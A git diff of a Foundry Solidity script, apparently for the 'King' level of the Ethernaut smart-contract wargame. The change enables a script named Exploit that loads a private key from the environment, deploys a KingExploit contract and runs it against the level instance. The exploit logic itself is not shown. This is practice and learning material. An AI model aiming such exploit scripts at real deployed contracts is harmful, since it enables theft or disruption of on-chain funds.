@@ -4,20 +4,20 @@
 pragma solidity ^0.8.0;
 
 import "forge-std/Script.sol";
-import {King} from "src/09/King.sol";
+import {KingExploit} from "src/09/KingExploit.sol";
 
-/*
+
 contract Exploit is Script {
 
-        address instance = vm.envAddress("INSTANCE_LEVEL9");
-        King level = King(instance);        
+        KingExploit public exploit;   
+        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL9"));    
+        address hacker = vm.envAddress("PRIVATE_KEY");    
         
         function run() external {
 
-            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-
-            
+            vm.startBroadcast(hacker);
+            exploit = new KingExploit();
+            exploit.run(instance);
             vm.stopBroadcast();
     }
 }
-*/
